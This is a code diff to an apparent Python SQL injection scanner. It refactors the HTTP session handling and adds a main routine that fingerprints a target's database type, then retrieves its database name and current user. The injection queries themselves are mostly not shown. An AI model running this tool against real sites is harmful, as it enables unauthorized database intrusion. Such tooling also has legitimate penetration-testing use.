@@ -6,6 +6,7 @@ class SQLInjectionScanner:
     def __init__(self, target_url, database_type):
         self.target_url = target_url
         self.database_type = database_type
+        self.session = aiohttp.ClientSession()
         self.db_dict = {
             "MySQL": ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()', '1064 You have an error in your SQL syntax'],
             "PostGre": ['PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string', 'unterminated dollar-quoted string', 'column not found', 'relation not found', 'function not found'],
@@ -74,7 +75,7 @@ class SQLInjectionScanner:
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with session.post(full_url, data=post_data) as response:
+                async with self.session.post(full_url, data=post_data) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
@@ -92,7 +93,7 @@ class SQLInjectionScanner:
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with session.post(full_url, data=post_data) as response:
+                async with self.session.post(full_url, data=post_data) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
@@ -110,7 +111,7 @@ class SQLInjectionScanner:
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with session.post(full_url, data=post_data) as response:
+                async with self.session.post(full_url, data=post_data) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
@@ -127,11 +128,13 @@ class SQLInjectionScanner:
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with session.post(full_url, data=post_data) as response:
+                # Changed from session.post to self.session.post
+                async with self.session.post(full_url, data=post_data) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
                 print(f"Error performing POST request for query '{query}': {e}")
+
     async def perform_advantage_get_database_name(self):
         print("Advantage Database: Retrieving Database name...")
         for query in [
@@ -143,7 +146,7 @@ class SQLInjectionScanner:
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with session.post(full_url, data=post_data) as response:
+                async with self.session.post(full_url, data=post_data) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
@@ -160,11 +163,14 @@ class SQLInjectionScanner:
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with session.post(full_url, data=post_data) as response:
+                async with self.session.post(full_url, data=post_data) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
                 print(f"Error performing POST request for query '{query}': {e}")
+    
+    async def close_session(self):
+        await self.session.close()
 
 # Get Current User
     async def get_current_user(self):
@@ -373,7 +379,19 @@ async def main():
     parser = argparse.ArgumentParser(description="SQL Injection Scanner")
     parser.add_argument("target_url", help="Target URL")
     args = parser.parse_args()
-    await SQLInjectionScanner.create(args.target_url)
+
+    # Creating the scanner and running the scan
+    scanner = SQLInjectionScanner(args.target_url, "")
+    db_type = await scanner.scan_database_type()
     
+    if db_type:
+        await scanner.get_database_name()
+        await scanner.get_current_user()
+    else:
+        print(f"Could not find a vulnerability...")
+
+    # Closing the session when done
+    await scanner.close_session()
+
 if __name__ == "__main__":
     asyncio.run(main())
